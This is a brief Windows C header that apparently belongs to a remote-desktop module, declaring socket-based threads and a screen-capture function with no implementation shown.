#pragma once
#define COBJMACROS
#define _CRT_SECURE_NO_WARNINGS
#include <Objbase.h>
#include <wincodec.h>
#include <Windows.h>
#include <Winerror.h>
#include <Shlwapi.h>
#include <process.h>
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Windowscodecs.lib")

#include "DVpro.h"
#include "Shared.h"
typedef struct socketdata {
	SOCKET s;
} SOCKETDATA;

BOOL kill_rdp ;

DWORD CALLBACK RDP_THREAD(SOCKETDATA*);
void FRAMES_THREAD(SOCKETDATA* );
IStream* ScreenShot();